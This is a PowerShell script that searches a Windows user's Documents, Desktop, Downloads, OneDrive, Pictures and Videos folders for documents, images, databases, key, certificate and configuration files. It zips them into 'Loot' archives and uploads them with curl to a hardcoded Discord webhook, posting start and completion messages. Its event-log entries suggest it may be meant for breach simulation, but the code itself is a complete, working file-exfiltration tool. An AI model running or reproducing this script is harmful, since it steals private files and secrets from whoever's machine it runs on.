# Set the webhook URL
$hookurl = "https://discord.com/api/webhooks/1249976112050864252/FGTwRu5AezB17SGk4Pc_kbVFq8ip_b_E1tsPpbkyt8mPgghI5WrNRgfXyFQJ6LLfBSsw"

# Function for exfiltration
Function Exfiltrate {
    param ([string[]]$FileType, [string[]]$Path)

    # Log exfiltration start
    Write-EventLog -LogName "Windows PowerShell" -Source "PowerShell" -EventId 1001 -EntryType Information -Message "Exfiltration Process Started on $env:COMPUTERNAME by $env:USERNAME"

    # Preparing the JSON data for initial webhook notification
    $jsonsys = @{
        "username" = "$env:COMPUTERNAME"
        "content" = ":file_folder: ``Exfiltration Started..`` :file_folder:
        $env:USERPROFILE\Documents
        $env:USERPROFILE\Desktop
        $env:USERPROFILE\Downloads
        $env:USERPROFILE\OneDrive
        $env:USERPROFILE\Pictures
        $env:USERPROFILE\Videos"
    } | ConvertTo-Json

    # Send start notification to webhook
    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys

    $maxZipFileSize = 100MB
    $currentZipSize = 0
    $index = 1
    $zipFilePath = "$env:temp/Loot$index.zip"

    if ($Path -ne $null) {
        $foldersToSearch = "$env:USERPROFILE\" + $Path
    } else {
        $foldersToSearch = @(
            "$env:USERPROFILE\Documents",
            "$env:USERPROFILE\Desktop",
            "$env:USERPROFILE\Downloads",
            "$env:USERPROFILE\OneDrive",
            "$env:USERPROFILE\Pictures",
            "$env:USERPROFILE\Videos"
        )
    }

    if ($FileType -ne $null) {
        $fileExtensions = "*." + $FileType
    } else {
        $fileExtensions = @(
            "*.log", "*.db", "*.txt", "*.doc", "*.pdf", "*.jpg",
            "*.jpeg", "*.png", "*.wdoc", "*.xdoc", "*.cer", "*.key",
            "*.xls", "*.xlsx", "*.cfg", "*.conf", "*.wpd", "*.rft"
        )
    }

    Add-Type -AssemblyName System.IO.Compression.FileSystem
    $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')

    foreach ($folder in $foldersToSearch) {
        foreach ($extension in $fileExtensions) {
            $files = Get-ChildItem -Path $folder -Filter $extension -File -Recurse
            foreach ($file in $files) {
                $fileSize = $file.Length
                if ($currentZipSize + $fileSize -gt $maxZipFileSize) {
                    $zipArchive.Dispose()
                    $currentZipSize = 0

                    # Log each zip creation and sending
                    Write-EventLog -LogName "Windows PowerShell" -Source "PowerShell" -EventId 1002 -EntryType Information -Message "Creating and sending zip file $zipFilePath"
                    curl.exe -F file1=@"$zipFilePath" $hookurl
                    Remove-Item -Path $zipFilePath -Force
                    Sleep 1
                    $index++
                    $zipFilePath = "$env:temp/Loot$index.zip"
                    $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
                }
                $entryName = $file.FullName.Substring($folder.Length + 1)
                [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zipArchive, $file.FullName, $entryName)
                $currentZipSize += $fileSize
            }
        }
    }
    $zipArchive.Dispose()
    curl.exe -F file1=@"$zipFilePath" $hookurl
    Remove-Item -Path $zipFilePath -Force

    # Log completion of exfiltration
    Write-EventLog -LogName "Windows PowerShell" -Source "PowerShell" -EventId 1003 -EntryType Information -Message "Exfiltration Process Completed on BASexfiltration by $env:USERNAME"

    # Send completion notification to webhook
    $cmp = @{
        "username" = "$BASexfiltration"
        "content" = "Exfiltration Complete."
    } | ConvertTo-Json
    Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $cmp
}

# Execute the exfiltration function
Exfiltrate
